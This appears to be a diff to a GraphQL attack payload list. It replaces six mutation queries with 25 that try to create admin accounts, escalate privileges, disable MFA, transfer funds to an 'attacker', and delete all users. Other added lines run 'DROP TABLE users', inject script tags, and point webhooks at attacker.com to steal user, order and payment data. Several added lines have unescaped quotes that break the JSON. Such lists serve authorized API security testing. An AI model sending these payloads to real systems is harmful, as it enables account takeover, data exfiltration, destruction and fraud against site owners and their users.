@@ -1,6 +1,25 @@
-{"query":"mutation { deleteUser(id: 1) { success } }"}
-{"query":"mutation { updateUserRole(id: 1, role: \"admin\") { id role } }"}
-{"query":"mutation { resetPassword(email: \"admin@target.com\") { success } }"}
-{"query":"mutation { createUser(email: \"attacker@evil.com\", role: \"admin\", password: \"hack\") { id token } }"}
-{"query":"mutation { promoteUser(id: 1) { id role } }"}
-{"query":"mutation { generateApiKey(userId: 1) { key } }"}
+{"query":"mutation{createAdmin(username:"attacker",password:"hacked",role:"admin"){id token}}"}
+{"query":"mutation{updateUser(id:1,input:{role:"ADMIN",isAdmin:true,permissions:["ALL"]}){id role isAdmin}}"}
+{"query":"mutation{deleteUser(id:1){success message}}"}
+{"query":"mutation{deleteAllUsers{success count}}"}
+{"query":"mutation{transferFunds(from:"victim",to:"attacker",amount:999999){success balance}}"}
+{"query":"mutation{resetUserPassword(userId:1,newPassword:"hacked"){success}}"}
+{"query":"mutation{disableMFA(userId:1){success}}"}
+{"query":"mutation{revokeAllTokens(userId:1){success count}}"}
+{"query":"mutation{updateEmail(userId:1,email:"attacker@evil.com"){success}}"}
+{"query":"mutation{elevatePrivileges(userId:1,role:"ADMIN"){success role}}"}
+{"query":"mutation{generateAdminToken(userId:1){token expiresAt}}"}
+{"query":"mutation{createWebhook(url:"http://attacker.com/steal",events:["USER_DATA","ORDERS","PAYMENTS"]){id secret}}"}
+{"query":"mutation{updateWebhook(id:1,url:"http://attacker.com/steal"){id url}}"}
+{"query":"mutation{addApiKey(userId:1,permissions:["read","write","admin"]){key secret}}"}
+{"query":"mutation{updateConfig(key:"admin_email",value:"attacker@evil.com"){success}}"}
+{"query":"mutation{enableDebugMode{success}}"}
+{"query":"mutation{exportData(format:"json",includePasswords:true){data}}"}
+{"query":"mutation{importUsers(data:"[{username:attacker,role:admin,password:hacked}]"){success count}}"}
+{"query":"mutation{mergeAccounts(from:1,to:2){success}}"}
+{"query":"mutation{deleteData(table:"users",where:"1=1"){affected}}"}
+{"query":"mutation{executeRawQuery(sql:"DROP TABLE users"){result}}"}
+{"query":"mutation{sendEmail(to:"victim@example.com",subject:"Test",body:"<script>alert(1)</script>"){success}}"}
+{"query":"mutation{broadcastMessage(message:"<script>alert(1)</script>",channels:["all"]){success}}"}
+{"query":"mutation{createSession(userId:1,expiresIn:999999){token}}"}
+{"query":"mutation{revokeAdminAccess(userId:1){success}}"}
